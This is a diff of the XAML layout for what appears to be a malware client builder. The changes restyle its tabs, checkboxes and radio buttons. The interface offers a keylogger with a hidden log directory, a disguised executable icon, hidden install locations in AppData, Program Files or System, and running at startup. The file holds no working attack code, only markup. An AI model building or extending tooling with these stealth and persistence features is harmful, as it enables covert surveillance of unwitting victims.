@@ -21,9 +21,9 @@
 
         <Grid Background="White" Panel.ZIndex="99" Grid.Row="0">
             <StackPanel Orientation="Horizontal" VerticalAlignment="Top" Margin="0 -2">
-                <Button Uid="0" Width="110" Content="Network" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
-                <Button Uid="1" Width="110" Content="Standard" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
-                <Button Uid="2" Width="110" Content="Installation" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl"/>
+                <Button Cursor="Hand" Style="{StaticResource tabControl}" Uid="0" Width="110" Content="Network" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl" FontSize="14" FontWeight="Medium"/>
+                <Button Cursor="Hand" Style="{StaticResource tabControl}" Uid="1" Width="110" Content="Standard" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl" FontSize="14" FontWeight="Medium"/>
+                <Button Cursor="Hand" Style="{StaticResource tabControl}" Uid="2" Width="110" Content="Installation" VerticalAlignment="Center" Height="40" Background="{x:Null}" BorderBrush="{x:Null}" Foreground="Black" Click="btnTabControl" FontSize="14" FontWeight="Medium"/>
 
             </StackPanel>
             <Grid x:Name="GridCursor" Width="110" Height="4" Background="#4a9ff5" Margin="0 20 0 0" HorizontalAlignment="Left"/>
@@ -88,7 +88,7 @@
                         <StackPanel Orientation="Vertical">
                             <Label FontWeight="Medium" FontSize="25" Content="Keylogger"></Label>
 
-                            <CheckBox Margin="0 15 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                            <CheckBox Margin="0 15 0 0" Foreground="black" FontSize="11"
                                       x:Name="chkKeyLogger" Click="chkKeyLoggerEvent">
                                 Enable keylogger.
                             </CheckBox>
@@ -99,7 +99,7 @@
                                 <TextBox Style="{x:Null}" HorizontalAlignment="Left"  Width="200" x:Name="txtLogDir"/>
                             </StackPanel>
 
-                            <CheckBox Margin="0 15 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                            <CheckBox Margin="0 15 0 0" Foreground="black" FontSize="11"
                                       x:Name="chkHideLogsDir">
                                 Hide log directory.
                             </CheckBox>
@@ -107,7 +107,7 @@
                             <Label Margin="0 15" FontWeight="Medium" FontSize="25" Content="Set Icon"></Label>
 
                             <StackPanel Orientation="Vertical">
-                                <CheckBox x:Name="chkIcon" Style="{StaticResource MaterialDesignAccentCheckBox}" IsEnabled="False" Background="#4a9ff5" Foreground="black" FontSize="11" >
+                                <CheckBox x:Name="chkIcon" IsEnabled="False" Background="#4a9ff5" Foreground="black" FontSize="11" >
                                     Change Executable Icon.
                                 </CheckBox>
                                 <StackPanel Margin="0 0 0 0" VerticalAlignment="Top" Orientation="Horizontal">
@@ -124,7 +124,7 @@
                         <StackPanel Orientation="Vertical">
                             <Label FontWeight="Medium" FontSize="25" Content="Installation"></Label>
 
-                            <CheckBox Margin="0 15 0 0" x:Name="chkInstall" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                            <CheckBox Margin="0 15 0 0" x:Name="chkInstall" Foreground="black" FontSize="11"
                                        Click="chkInstallEvent">
                                 Add client to system path.
                             </CheckBox>
@@ -133,9 +133,9 @@
                                 <TextBlock x:Name="lblDirectory" Foreground="LightGray" Margin="0 15 0 0" Padding="0" FontSize="11" VerticalAlignment="top" 
                                            Text="Directory :" />
                                 <StackPanel Margin="15 0 0 0">
-                                    <RadioButton x:Name="radio1" Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 15 0 0" GroupName="Os" Content="User / AppData" IsChecked="True"/>
-                                    <RadioButton x:Name="radio2"  Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="Program Files"/>
-                                    <RadioButton x:Name="radio3"  Style="{StaticResource MaterialDesignAccentRadioButton}" Background="#4a9ff5" Margin="0 5 0 0" GroupName="Os" Content="System"/>
+                                    <RadioButton x:Name="radio1" Margin="0 15 0 0" GroupName="Os" Content="User / AppData" IsChecked="True"/>
+                                    <RadioButton x:Name="radio2" Margin="0 5 0 0" GroupName="Os" Content="Program Files"/>
+                                    <RadioButton x:Name="radio3" Margin="0 5 0 0" GroupName="Os" Content="System"/>
                                 </StackPanel>
                             </StackPanel>
                             
@@ -144,7 +144,7 @@
                                            Text="Subdirectory :" />
                                 <StackPanel Orientation="Horizontal">
                                     <TextBox Style="{x:Null}" HorizontalAlignment="Left" x:Name="txtSubDirI" Width="200"/>
-                                    <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                                    <CheckBox Margin ="15 0 0 0" Foreground="black" FontSize="11"
                                           x:Name="chkHideSubDirI">
                                         set to hidden.
                                     </CheckBox>
@@ -156,7 +156,7 @@
                                            Text="Name :" />
                                 <StackPanel Orientation="Horizontal">
                                     <TextBox Style="{x:Null}" HorizontalAlignment="Left" x:Name="txtFileNameI"  Width="200"/>
-                                    <CheckBox Margin ="15 0 0 0" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5" Foreground="black" FontSize="11"
+                                    <CheckBox Margin ="15 0 0 0" Foreground="black" FontSize="11"
                                           x:Name="chkHideFileI">
                                         set to hidden.
                                     </CheckBox>
@@ -165,7 +165,7 @@
                             <Label Margin="0 15 0 15" FontWeight="Medium" FontSize="25" Content="Startup"></Label>
 
                             <StackPanel Orientation="Vertical">
-                                <CheckBox x:Name="chkAutoStart" Style="{StaticResource MaterialDesignAccentCheckBox}" Background="#4a9ff5"
+                                <CheckBox x:Name="chkAutoStart"
                                           Foreground="black" FontSize="11" Click="chkAutoStartEvent">
                                     Run client on PC startup.
                                 </CheckBox>
